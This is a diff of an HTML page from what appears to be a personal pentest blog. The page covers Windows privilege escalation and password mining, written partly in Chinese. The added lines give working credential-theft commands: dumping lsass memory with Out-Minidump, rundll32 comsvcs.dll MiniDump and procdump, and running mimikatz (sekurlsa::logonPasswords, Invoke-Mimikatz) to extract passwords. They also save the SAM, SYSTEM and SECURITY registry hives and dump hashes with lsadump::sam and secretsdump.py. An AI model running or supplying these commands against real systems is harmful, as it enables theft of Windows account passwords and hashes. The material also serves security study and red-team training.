@@ -364,13 +364,18 @@ Kernel比較常見的就是利用 windows-kernel-exploits 取得相關cve來打
 <p><img src="https://i.imgur.com/V4ZNczf.png" alt=""></p>
 <h5 id="Metasploit-5"><a href="#Metasploit-5" class="headerlink" title="Metasploit"></a>Metasploit</h5><p><code>exploit/windows/local/always_install_elevated</code><br><a href="https://www.rapid7.com/db/modules/exploit/windows/local/always_install_elevated" target="_blank" rel="noopener">https://www.rapid7.com/db/modules/exploit/windows/local/always_install_elevated</a></p>
 <h2 id="Password-Mining"><a href="#Password-Mining" class="headerlink" title="Password Mining"></a>Password Mining</h2><h3 id="Memory"><a href="#Memory" class="headerlink" title="Memory"></a>Memory</h3><h4 id="Exploitation-7"><a href="#Exploitation-7" class="headerlink" title="Exploitation"></a>Exploitation</h4><ol>
-<li>Write the running process memory space to a file.</li>
+<li>Write the running process (lsass.exe) memory space to a file.</li>
 <li>Search for meaningful data.<br>(example is use strings &amp; grpe to search)</li>
 </ol>
 <h5 id="Taskmgr"><a href="#Taskmgr" class="headerlink" title="Taskmgr"></a>Taskmgr</h5><p><img src="https://i.imgur.com/f4kIvAj.png" alt=""></p>
-<h5 id="Powershell-PowerSploit-Exfiltration-Out-Minidump-ps1"><a href="#Powershell-PowerSploit-Exfiltration-Out-Minidump-ps1" class="headerlink" title="Powershell (PowerSploit/Exfiltration/Out-Minidump.ps1)"></a>Powershell (PowerSploit/Exfiltration/Out-Minidump.ps1)</h5><p>pid可以透過ps(powershell)或是tasklist(cmd)指令取得<br><img src="https://i.imgur.com/ivvBsIw.png" alt=""></p>
-<h5 id="Powershell-mimikittenz"><a href="#Powershell-mimikittenz" class="headerlink" title="Powershell (mimikittenz)"></a>Powershell (mimikittenz)</h5><p>todo</p>
-<h5 id="ProcDump"><a href="#ProcDump" class="headerlink" title="ProcDump"></a>ProcDump</h5><p><code>procdump.exe -accepteula -ma &lt;pid&gt;</code><br><img src="https://i.imgur.com/BMXyDl1.png" alt=""></p>
+<h5 id="Powershell-PowerSploit-Exfiltration-Out-Minidump-ps1"><a href="#Powershell-PowerSploit-Exfiltration-Out-Minidump-ps1" class="headerlink" title="Powershell (PowerSploit/Exfiltration/Out-Minidump.ps1)"></a>Powershell (PowerSploit/Exfiltration/Out-Minidump.ps1)</h5><p>pid可以透過ps (powershell)、Get-Process (powershell) 或是tasklist(cmd)指令取得<br><img src="https://i.imgur.com/Ibi0RWj.png" alt=""></p>
+<p><img src="https://i.imgur.com/ivvBsIw.png" alt=""><br>dump lsass<br><code>powershell.exe -exec bypass &quot;. .\Out-Minidump.ps1; Out-minidump (Get-process lsass)&quot;</code> (need admin)<br><img src="https://i.imgur.com/wM3BtAg.png" alt=""><br>dump 出來後可以用 mimikatz 進行解密，建議在哪台電腦 dump 的就在哪台電腦解<br><code>&quot;sekurlsa::minidump .\lsass_472.dmp&quot; &quot;sekurlsa::logonPasswords&quot;&#39;</code><br><img src="https://i.imgur.com/aNTDpLB.png" alt=""><br><code>mimikatz.exe</code> 也是差不多方法</p>
+<h5 id="Powershell-rundll32"><a href="#Powershell-rundll32" class="headerlink" title="Powershell (rundll32)"></a>Powershell (rundll32)</h5><p><code>C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full</code> (need admin)<br><img src="https://i.imgur.com/Au3fVtX.png" alt=""></p>
+<p>一樣用 mimikatz 解密<br><img src="https://i.imgur.com/WfR6WGd.png" alt=""></p>
+<p>推薦使用 powershell, cmd預設會需要開啟 <code>SeDebugPrivilege</code>, 這個在 Powershell 裡面是預設開啟的<br><img src="https://i.imgur.com/4TZvP3z.png" alt=""></p>
+<p><img src="https://i.imgur.com/YEDAdJT.png" alt=""></p>
+<h5 id="Powershell-mimikatz"><a href="#Powershell-mimikatz" class="headerlink" title="Powershell (mimikatz)"></a>Powershell (mimikatz)</h5><p><code>powershell -exec bypass &quot;import-module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz&quot;</code> (need admin)<br><img src="https://i.imgur.com/Z9seOi7.png" alt=""></p>
+<h5 id="ProcDump"><a href="#ProcDump" class="headerlink" title="ProcDump"></a>ProcDump</h5><p><code>procdump.exe -accepteula -ma &lt;pid&gt;</code><br><img src="https://i.imgur.com/BMXyDl1.png" alt=""><br>dump lsass<br><code>procdump.exe -accepteula -ma lsass</code> (need admin)<br><img src="https://i.imgur.com/iiDzA56.png" alt=""></p>
 <h3 id="Registry-2"><a href="#Registry-2" class="headerlink" title="Registry"></a>Registry</h3><p>AutoLogin can be setup via:</p>
 <ol>
 <li>Group Policy Preference</li>
@@ -384,7 +389,8 @@ Kernel比較常見的就是利用 windows-kernel-exploits 取得相關cve來打
 </li>
 </ul>
 <h4 id="Detection-7"><a href="#Detection-7" class="headerlink" title="Detection"></a>Detection</h4><h5 id="Powershell-4"><a href="#Powershell-4" class="headerlink" title="Powershell"></a>Powershell</h5><p><code>Get-ItemProperty &lt;reg key&gt;</code><br><img src="https://i.imgur.com/dFZtXmV.png" alt=""></p>
-<h5 id="cmd-4"><a href="#cmd-4" class="headerlink" title="cmd"></a>cmd</h5><p><code>reg query &lt;reg key&gt;</code><br><img src="https://i.imgur.com/gD1t4C0.png" alt=""></p>
+<p><code>Get-ItemProperty</code></p>
+<h5 id="cmd-4"><a href="#cmd-4" class="headerlink" title="cmd"></a>cmd</h5><p><code>reg query &lt;reg key&gt;</code><br><img src="https://i.imgur.com/gD1t4C0.png" alt=""><br><code>reg save HKLM\SYSTEM system.hiv</code><br><code>reg save HKLM\SAM sam.hiv</code><br><code>reg save HKLM\security security.hiv</code><br><img src="https://i.imgur.com/FiHjcqt.png" alt=""><br><code>&quot;lsadump::sam /system:system.hiv /sam:sam.hiv&quot;</code><br><img src="https://i.imgur.com/1eb224G.png" alt=""><br><code>secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL</code><br><img src="https://i.imgur.com/Gbe3jYS.png" alt=""></p>
 <h4 id="Exploitation-8"><a href="#Exploitation-8" class="headerlink" title="Exploitation"></a>Exploitation</h4><ul>
 <li>VNC</li>
 </ul>
@@ -502,7 +508,7 @@ Kernel比較常見的就是利用 windows-kernel-exploits 取得相關cve來打
 
                     
                 </ul>
-                <p class="copyright text-muted">&copy; 2020 AStar<br></p>
+                <p class="copyright text-muted">&copy; 2021 AStar<br></p>
                 <p class="copyright text-muted">Original Theme <a target="_blank" href="http://startbootstrap.com/template-overviews/clean-blog/">Clean Blog</a> from <a href="http://startbootstrap.com/" target="_blank">Start Bootstrap</a></p>
                 <p class="copyright text-muted">Adapted for <a target="_blank" href="https://hexo.io/">Hexo</a> by <a href="http://www.codeblocq.com/" target="_blank">Jonathan Klughertz</a></p>
             </div>
